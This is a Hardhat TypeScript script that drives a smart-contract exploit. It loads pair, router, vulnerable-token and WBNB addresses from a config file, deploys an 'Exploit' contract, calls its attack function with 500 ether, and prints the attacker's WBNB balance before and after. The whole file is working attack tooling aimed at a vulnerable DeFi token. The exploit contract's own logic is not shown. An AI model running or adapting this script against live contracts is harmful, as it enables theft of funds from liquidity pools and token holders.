import {Exploit__factory, IERC20__factory} from "../typechain";
import hre, { ethers } from "hardhat"
import YAML from 'yaml'
import fs from 'fs'


//step 1 find all the pairs related to the token
//todo: interate all the DEX factory list and find all the token related pairs from factory


async function main() {
  // Read parameters from config.yml
  const config_file = fs.readFileSync('config.yml', 'utf8');
  const config = YAML.parse(config_file);
  console.log(config.address.PAIR);
  // Execute exploit
  const [signer] = await hre.ethers.getSigners();
  const exploit = await new Exploit__factory(signer).deploy(
    config.address.PAIR,
    config.address.ROUTER,
    config.address.VULNERABLE_TOKEN,
    config.address.WBNB);
  console.log("Exploit contract deployed to: ",exploit.address)
  const WBNB = IERC20__factory.connect(config.address.WBNB,signer);
  console.log("Attacker WBNB balance:", hre.ethers.utils.formatUnits(await WBNB.balanceOf(signer.address),await WBNB.decimals()))
  const exploitTx = await exploit.attack({value: ethers.utils.parseEther("500")});
  console.log("Exploiting... transcation: ",exploitTx.hash)
  await exploitTx.wait()
  console.log("Exploit complete.")
  console.log("Attacker WBNB balance:",hre.ethers.utils.formatUnits(await WBNB.balanceOf(signer.address),await WBNB.decimals()))
  // Get result
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});